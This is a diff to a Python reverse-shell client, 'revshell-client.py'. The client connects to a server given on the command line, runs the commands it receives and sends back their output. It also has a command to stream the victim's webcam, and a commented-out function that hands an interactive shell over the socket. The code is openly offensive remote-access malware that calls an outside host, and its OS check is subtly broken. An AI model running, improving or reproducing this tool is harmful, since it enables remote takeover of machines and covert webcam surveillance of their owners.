@@ -13,11 +13,13 @@ import imutils
 
 # def spawn_shell(s):
 	
-# 	os.dup2(s.fileno(), 0) 
-# 	os.dup2(s.fileno(), 1) 
-# 	os.dup2(s.fileno(), 2) 
-# 	subprocess.run(["/bin/sh","-i"])
-
+# 	os.dup2(s.fileno(), 0)
+# 	os.dup2(s.fileno(), 1)
+# 	os.dup2(s.fileno(), 2)
+# 	if os.name == 'Linux':
+# 		subprocess.run(["/bin/sh","-i"])
+# 	elif os.name == 'win32':
+# 	subprocess.run(["cmd.exe"])
 
 # Capture video with webcam
 
@@ -53,11 +55,11 @@ def main(SERVER_HOST, SERVER_PORT):
 				output = str(e)
 			else:
 				output = ""
-		elif splitted_command[0] == "record":
+		elif splitted_command[0] == "webcam":
 			stream = VideoStream(s)
 			stream.send()
-		#elif command == "shell":
-		#	spawn_shell(s)
+		# elif command == "shell":
+		# 	spawn_shell(s)
 		else:
 			output = subprocess.getoutput(command)
 			s.send(output.encode())
@@ -68,4 +70,5 @@ if __name__ == '__main__':
 	if len(sys.argv) != 3:
 		print("Usage: python3 revshell-client.py <ip> <port>")
 		exit(1)
+	print(os.name)
 	main(sys.argv[1], int(sys.argv[2]))
